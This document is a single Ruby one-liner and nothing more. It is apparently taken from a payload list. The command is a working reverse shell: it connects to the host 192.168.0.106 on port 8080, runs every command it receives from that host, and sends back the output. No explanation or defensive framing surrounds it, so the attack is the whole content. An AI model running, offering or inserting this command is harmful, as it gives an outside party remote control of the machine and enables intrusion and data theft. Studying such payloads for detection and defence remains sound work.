ruby -rsocket -e "c=TCPSocket.new('192.168.0.106','8080');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end"
